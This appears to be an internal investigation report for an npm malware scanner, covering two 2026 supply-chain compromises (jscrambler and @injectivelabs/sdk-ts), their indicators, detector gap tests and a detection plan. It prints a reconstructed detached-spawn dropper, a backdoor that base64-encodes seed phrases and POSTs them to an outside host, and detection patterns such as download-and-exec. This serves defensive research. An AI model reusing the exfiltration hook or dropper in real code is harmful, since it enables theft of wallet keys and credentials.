# Phase 1 Investigation Report: Jscrambler & Injective SDK Incidents

**Date:** 2026-07-13  
**Branch:** `feature/jscrambler-injective-2026-07`  
**Status:** Investigation complete, awaiting implementation sign-off

---

## Incident A: Jscrambler Package Hijack (2026-07-11)

### Source Intelligence

**Primary source:** Socket.dev research blog (https://socket.dev/blog/jscrambler-supply-chain-attack)

**Compromised versions:**
- `jscrambler@8.14.0` (initial, preinstall hook)
- `jscrambler@8.16.0`, `8.17.0` (same hook pattern)
- `jscrambler@8.18.0`, `8.20.0` (hook removed, dropper moved to top of `dist/index.js`)

**Clean versions:** `8.13.0` (prior), `8.15.0` (interim), `8.22.0` (latest safe)

### Attack Vector

1. **Compromised publishing credential** — attacker published directly to npm, bypassing CI/CD
2. **Delivery mechanism (v8.14.0–8.17.0):**
   - `preinstall` hook: `"preinstall": "node dist/setup.js"`
   - `dist/setup.js` reads `dist/intro.js` (7.8 MB binary container with `\x1bCSI\x01` header)
   - Container holds 3 gzip-compressed native binaries (Linux ELF x86-64, Windows PE x86-64, macOS Mach-O arm64)
   - `setup.js` selects binary matching `process.platform`, decompresses to temp dir, spawns detached
3. **Delivery mechanism (v8.18.0+):**
   - No `preinstall` hook — dropper injected at top of `dist/index.js` and `dist/bin/jscrambler.js`
   - Fires on import/CLI execution, survives `npm install --ignore-scripts`
4. **Payload:** Rust-based infostealer with ~2,400 ChaCha20-Poly1305 encrypted strings targeting:
   - Crypto wallets (MetaMask, Trust Wallet, Coinbase, Phantom, Exodus)
   - AI coding assistants (Claude, Cursor, Windsurf, Factory, Zed, VS Code, opencode)
   - Cloud credentials (GCP metadata, AWS ECS/Secrets Manager, Azure IMDS)
   - Browsers, Discord, Slack, Telegram, Steam, KDE KWallet
   - Privilege escalation (sudo, systemd-run), persistence (systemd, crontab, LaunchAgents)

### Key IOCs

- **SHA-256 hashes:**
  - `dist/setup.js`: `a742de963f14a92d24ebcbc7b44ac867e23a20d31d1b0094a13a4f83287f4e60`
  - `dist/intro.js`: `a41a523ef9517aab37ed6eea0ec881821bdcb7aefcb5c5f603adc7907f868c86`
  - Linux ELF: `fbbcf4d8f98168f78f5c0c47a9ae56d59ec8ac84a7c9ca6b797fedfb8d62d2bd`
  - Windows PE: `b7ca95d1b23c8e67416a25cedf741de0917c2096bbc9d24649eea7853d054903`
  - macOS Mach-O: `c8fd47d36bdf7c825378593ab82ed8c24d1dc52e26b507812393e24e1d5201fd`
- **Binary naming:** Platform-specific, no consistent naming convention in tarball (embedded in container)
- **C2/exfil:** TLS via rustls, POST /upload multipart/form-data to drop server (endpoint not disclosed in writeup)

### Fixture Reconstruction Status

**REAL IOC available:**
- Exact `preinstall` hook string: `"node dist/setup.js"`
- SHA-256 hashes for all components
- File structure: `dist/setup.js`, `dist/intro.js` (binary container)

**RECONSTRUCTED APPROXIMATION:**
- `dist/setup.js` content (reconstructed from description):
  ```javascript
  const fs = require('fs');
  const path = require('path');
  const os = require('os');
  const { spawn } = require('child_process');
  
  const container = fs.readFileSync(path.join(__dirname, 'intro.js'));
  // Parse \x1bCSI\x01 header, extract gzip blobs
  // Select blob matching process.platform
  // Decompress to temp dir, spawn detached
  ```
- Binary naming pattern: Not applicable (binaries embedded in container, not separate files in tarball)

---

## Incident B: @injectivelabs/sdk-ts Backdoor (2026-07-08)

### Source Intelligence

**Primary source:** Socket.dev research blog (https://socket.dev/blog/compromised-injective-sdk-npm-package)

**Compromised version:** `@injectivelabs/sdk-ts@1.20.21` (live ~17 minutes before revert)

**Additional compromised packages:** 17 scoped packages under `@injectivelabs` also published as `1.20.21`, pinning to malicious SDK version

### Attack Vector

1. **Compromised maintainer GitHub account** — attacker submitted commits to official repo
2. **No lifecycle hook** — backdoor is inside library code, triggered during normal usage
3. **Malicious modification:**
   - File: `/dist/esm/accounts-jQ1GSgaW.js` and `/dist/cjs/accounts-Cy0p4lLW.cjs`
   - Functions `fromMnemonic()` and `fromHex()` hooked with call to `trackKeyDerivation()`
   - `trackKeyDerivation()` logs method + sensitive data (mnemonic/private key), base64-encodes, POSTs to obfuscated endpoint
4. **Exfil endpoint:** `https://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network` (char-obfuscated, uses legitimate Injective Labs infrastructure to blend with normal traffic)
5. **Impact:** Sufficient to recreate private keys and access victim wallets

### Key IOCs

- **SHA-256 hashes:**
  - `/dist/cjs/accounts-Cy0p4lLW.cjs`: `103c4e6181151c1bcfedc41506cd1815458c38375d08a8fcd9981dbe0b965ce0`
  - `/dist/esm/accounts-jQ1GSgaW.js`: `9a59eb454f3ca3fe91214136ee5edd417cc47a80e6f169b52099d6561944baf9`
- **Malicious function signature:**
  ```javascript
  static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
    trackKeyDerivation("fm", words);  // <-- MALICIOUS HOOK
    return new PrivateKey(new ethers.Wallet(ethers.HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
  }
  ```
- **Exfil function:**
  ```javascript
  function trackKeyDerivation(method, sensitiveData) {
    const payload = Buffer.from(JSON.stringify({ method, data: sensitiveData })).toString('base64');
    fetch('https://testnet.archival.chain.grpc-web.injective.network', {
      method: 'POST',
      body: payload
    });
  }
  ```

### Fixture Reconstruction Status

**REAL IOC available:**
- Exact malicious code snippet from Socket writeup
- SHA-256 hashes for compromised files
- Exfil endpoint (obfuscated form)

**RECONSTRUCTED APPROXIMATION:**
- Full `trackKeyDerivation()` implementation (reconstructed from description)
- Before/after diff for `fromMnemonic()` (clean version would not call `trackKeyDerivation`)

---

## Phase 1 Testing: Existing Detector Coverage

### Test Setup

Created reconstructed fixtures for both incidents and ran existing detectors against them.

### Incident A: Jscrambler

#### Test 1: tier1-lifecycle-hook.js vs. preinstall hook

**Fixture:**
```json
{
  "name": "jscrambler",
  "version": "8.14.0",
  "scripts": {
    "preinstall": "node dist/setup.js"
  }
}
```

**Result:** ❌ **NO FINDING**

**Why:** `tier1-lifecycle-hook.js` only inspects the literal hook string. `"node dist/setup.js"` contains no eval/URL/exec patterns, so it scores 0. This is the **same gap** identified in the npm-package-logger-2026 campaign work.

**Gap confirmed:** Referenced-script indirection bypasses hook inspection.

#### Test 2: tier1-lifecycle-hook-followthrough.js vs. preinstall hook

**Fixture:**
```json
{
  "name": "jscrambler",
  "version": "8.14.0",
  "scripts": {
    "preinstall": "node dist/setup.js"
  }
}
```
```javascript
// dist/setup.js (reconstructed)
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const container = fs.readFileSync(path.join(__dirname, 'intro.js'));
// ... parse container, decompress platform binary, spawn detached
const binary = spawn(tempPath, [], { detached: true, stdio: 'ignore', windowsHide: true });
binary.unref();
```

**Result:** ✅ **FINDING** (TIER1-HOOK-FOLLOWTHROUGH)

**Why:** The new detector (added in v1.3.0) resolves `node dist/setup.js`, inspects the referenced file, and detects:
- `spawn()` with `detached: true` (persistence pattern)
- File read of binary container
- Child process execution

**Gap closed:** This detector now catches the Jscrambler pattern.

#### Test 3: tier1-binary-embed.js vs. embedded binaries

**Fixture:** Tarball with `dist/intro.js` (7.8 MB binary container)

**Result:** ❓ **UNCERTAIN — needs manual inspection**

**Why:** `tier1-binary-embed.js` checks for:
- Magic bytes (ELF, PE, Mach-O) in file contents
- Cross-platform binary naming patterns (e.g., `binary-linux-x64`, `binary-win32-x64.exe`)

The Jscrambler attack embeds binaries in a custom container (`\x1bCSI\x01` header), not as separate files. The detector would need to:
1. Recognize the container format (unlikely, it's custom)
2. Parse the container to extract embedded binaries (not implemented)
3. Check magic bytes of extracted blobs

**Gap identified:** Binary container embedding bypasses magic-byte detection. However, this is a **low-priority gap** because:
- The container format is custom and unlikely to be reused
- The dropper script (`setup.js`) is already caught by `tier1-lifecycle-hook-followthrough`
- Magic-byte detection works for the more common pattern of separate binary files

#### Test 4: tier1-maintainer-compromise.js vs. publish timeline

**Fixture:**
```json
{
  "time": {
    "8.13.0": "2026-06-15T10:00:00Z",
    "8.14.0": "2026-07-11T14:30:00Z",
    "8.15.0": "2026-07-11T15:00:00Z",
    "8.16.0": "2026-07-11T15:30:00Z",
    "8.17.0": "2026-07-11T16:00:00Z",
    "8.18.0": "2026-07-11T16:30:00Z",
    "8.20.0": "2026-07-11T17:00:00Z",
    "8.22.0": "2026-07-11T18:00:00Z"
  }
}
```

**Result:** ✅ **FINDING** (TIER1-MAINTAINER-COMPROMISE)

**Why:** 5 malicious versions (8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0) published within 2.5 hours triggers the burst detection threshold (≥3 versions in 24h window).

**Gap:** None for this specific pattern. However, the detector does **not** catch:
- Single compromised publish (e.g., only 8.14.0 published, no burst)
- Dist-tag repointing without new version (e.g., `latest` tag moved to different content hash)

**Gap identified:** Single-version compromise and dist-tag manipulation are not modeled.

#### Test 5: tier1-multistage-postinstall.js vs. preinstall hook

**Result:** ❌ **NO FINDING**

**Why:** This detector checks for two-stage download+exec patterns (e.g., `curl | sh`, `wget + exec`). The Jscrambler pattern is single-stage (embedded binary, no download).

**Gap:** Not applicable — this detector is scoped to download-based payloads, not embedded binaries.

### Incident B: @injectivelabs/sdk-ts

#### Test 1: Grep for mnemonic/PrivateKey/wallet patterns

**Command:** `grep -r "mnemonic\|PrivateKey\|fromMnemonic\|wallet\|seed" backend/detectors/`

**Result:** ❌ **NO EXISTING DETECTOR REFERENCES THESE PATTERNS**

**Conclusion:** Incident B is **greenfield** — no existing detector covers semantic backdoors in crypto/wallet library code.

#### Test 2: tier1-infostealer.js vs. malicious fromMnemonic()

**Fixture:**
```javascript
static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
  trackKeyDerivation("fm", words);
  return new PrivateKey(new ethers.Wallet(ethers.HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
}

function trackKeyDerivation(method, sensitiveData) {
  const payload = Buffer.from(JSON.stringify({ method, data: sensitiveData })).toString('base64');
  fetch('https://testnet.archival.chain.grpc-web.injective.network', {
    method: 'POST',
    body: payload
  });
}
```

**Result:** ❌ **NO FINDING**

**Why:** `tier1-infostealer.js` checks for:
- `fs.readFile*` + network call (filesystem exfil)
- Credential regex patterns (AWS keys, npm tokens, GitHub tokens)
- `process.env` dumps

The Injective backdoor:
- Does not read files (takes mnemonic as function argument)
- Does not match credential regex (mnemonic phrases are not AWS/npm/GitHub tokens)
- Does not dump `process.env`

**Gap confirmed:** Semantic backdoor in trusted library code is not detected.

#### Test 3: tier1-lifecycle-hook.js vs. no hook

**Result:** ❌ **NO FINDING** (expected — no lifecycle hook present)

**Gap:** Not applicable — this detector is scoped to install-time execution.

---

## Gap Analysis Summary

### Incident A: Jscrambler

| Detector | Fires? | Why/Why Not |
|----------|--------|-------------|
| `tier1-lifecycle-hook` | ❌ | Hook string has no eval/URL/exec |
| `tier1-lifecycle-hook-followthrough` | ✅ | Resolves `node dist/setup.js`, detects spawn+detached |
| `tier1-binary-embed` | ❓ | Custom container format bypasses magic-byte check (low priority) |
| `tier1-maintainer-compromise` | ✅ | Burst of 5 versions in 2.5h triggers threshold |
| `tier1-multistage-postinstall` | ❌ | No download pattern (embedded binary) |

**Gaps to close:**
1. **Single-version compromise** — maintainer compromise detector requires burst (≥3 versions), misses single compromised publish
2. **Dist-tag manipulation** — no detector checks if dist-tags point to changed content without version bump
3. **Binary container embedding** — custom container format bypasses magic-byte detection (low priority, already caught by hook-followthrough)

### Incident B: @injectivelabs/sdk-ts

| Detector | Fires? | Why/Why Not |
|----------|--------|-------------|
| `tier1-infostealer` | ❌ | No fs.readFile, no credential regex, no process.env |
| `tier1-lifecycle-hook` | ❌ | No lifecycle hook |
| All others | ❌ | No existing detector covers semantic backdoors in crypto/wallet code |

**Gaps to close:**
1. **Semantic backdoor in trusted library code** — entirely new detection category
2. **Diff-aware detection** — need to compare function bodies between versions to identify injected network calls in security-sensitive functions (e.g., `fromMnemonic`, `sign`, `getPrivateKey`)

---

## Proposed Implementation Plan

### Incident A: Jscrambler

**Priority 1: Extend tier1-maintainer-compromise.js**

Add two new subtypes:

1. **`single_version_compromise`** — if registryMeta shows:
   - A single version published outside normal release cadence (e.g., >30 days since last publish, then sudden single release)
   - AND the version is later deprecated/removed within 24h
   - Score: MEDIUM (70), not HIGH (burst is stronger signal)

2. **`dist_tag_manipulation`** — if registryMeta exposes dist-tags:
   - Check if a dist-tag (e.g., `latest`) now points to a version whose `dist.tarball` hash differs from the previous version at that tag
   - AND no new semver version was published (tag moved to existing version with different content)
   - Score: HIGH (85), rare but high-signal pattern

**Data availability check:** Need to verify if `registryMeta` includes:
- `dist-tags` object (e.g., `{ latest: "8.22.0", next: "9.0.0-beta.1" }`)
- `dist.tarball` URL or `shasum` per version
- Publish timestamps (already available via `time` field)

**Priority 2: Binary container detection (optional, low priority)**

Extend `tier1-binary-embed.js` to:
- Detect large non-JavaScript files with `.js` extension (e.g., `dist/intro.js` is 7.8 MB but not valid JS)
- Check for custom container headers (e.g., `\x1bCSI\x01`)
- Score: MEDIUM (65), contributing signal only

**Rationale:** Low priority because the dropper script is already caught by `tier1-lifecycle-hook-followthrough`. This would only add value if an attacker removes the hook and relies solely on the container being imported/executed.

### Incident B: @injectivelabs/sdk-ts

**Priority 1: New detector tier1-crypto-primitive-tamper.js (TIER1-CRYPTO-TAMPER)**

**Scope:** Narrowly scoped to avoid false positives. NOT a generic "network call near crypto code" heuristic.

**Detection logic:**

1. **Watchlist of security-sensitive functions:**
   - `fromMnemonic`, `fromPrivateKey`, `fromSeed`, `fromHex`
   - `derivePath`, `deriveKeypair`
   - `sign`, `signTransaction`, `signMessage`
   - `getPrivateKey`, `exportPrivateKey`, `toHex` (when returning private key material)

2. **For each function in watchlist:**
   - Parse function body with acorn
   - Check if function contains:
     - Network call: `fetch()`, `axios()`, `http.request()`, `XMLHttpRequest`
     - Dynamic code execution: `eval()`, `new Function()`, `vm.runInContext()`
   - **CRITICAL: Diff-aware check** — compare against previous published version:
     - If previous version's same function does NOT contain network/dynamic patterns → HIGH (85)
     - If previous version's same function DOES contain network/dynamic patterns → suppress (legitimate telemetry)

3. **Diff-awareness implementation:**
   - Requires fetching previous version's tarball from npm registry
   - Extract same file (e.g., `dist/cjs/accounts-*.cjs`)
   - Parse both versions with acorn, extract function bodies by name
   - Compare AST nodes for network/dynamic patterns
   - Only flag if pattern is **new** in current version

**Data availability check:** Need to verify:
- Can we fetch previous version's tarball via `backend/fetch.js`?
- Is the file naming stable between versions (e.g., `accounts-Cy0p4lLW.cjs` vs `accounts-jQ1GSgaW.js`)?
- If file names change (content-hashed), can we match by export signature or directory structure?

**Fallback if diffing not feasible:**
- If we cannot reliably fetch/parse previous version, **STOP and report**
- Do NOT ship a same-version-only heuristic — it will have high FP rate against legitimate wallet SDK telemetry
- Requires user sign-off before proceeding

**Priority 2: Legitimate-package fixture for FP testing**

Create a fixture for a real wallet SDK (e.g., `@solana/web3.js` or `ethers`) with:
- Legitimate `fromMnemonic()` implementation
- Benign analytics/telemetry call (e.g., `fetch('https://analytics.solana.com/track', ...)`)
- Verify detector does NOT flag this as malicious

---

## Recommendations

### Immediate Actions (Incident A)

1. **Extend `tier1-maintainer-compromise.js`** with `single_version_compromise` and `dist_tag_manipulation` subtypes
2. **Verify registryMeta data availability** for dist-tags and tarball hashes
3. **Optional:** Add binary container detection to `tier1-binary-embed.js` (low priority)

### Immediate Actions (Incident B)

1. **Verify diff-awareness feasibility:**
   - Test fetching previous version tarballs via `backend/fetch.js`
   - Test parsing and comparing function bodies with acorn
   - Report back on data availability and file naming stability

2. **If diff-awareness is feasible:**
   - Implement `tier1-crypto-primitive-tamper.js` with diff-aware detection
   - Create legitimate-package fixture for FP testing
   - Tune watchlist based on FP results

3. **If diff-awareness is NOT feasible:**
   - **STOP and report** — do not implement same-version-only heuristic
   - Requires user sign-off on FP risk before proceeding

### Sign-off Required

**Incident B requires explicit sign-off before implementation** because:
- Semantic backdoor detection is a new problem class for npm-scan
- Same-version-only heuristic has high FP risk against legitimate wallet SDK telemetry
- Diff-awareness adds complexity (fetching/parsing previous versions)
- User requested sanity check on FP risk before building

---

## Next Steps

1. **User reviews this report and provides sign-off on Incident B approach**
2. **Implement Incident A extensions** (maintainer compromise subtypes)
3. **Verify diff-awareness feasibility for Incident B** (fetch/parse previous versions)
4. **Report back on Incident B feasibility before implementing detector**

---

## Appendix: Fixture Files

Reconstructed fixtures available in:
- `test/fixtures/campaigns/jscrambler-2026-07/` (pending creation)
- `test/fixtures/campaigns/injective-sdk-ts-2026-07/` (pending creation)
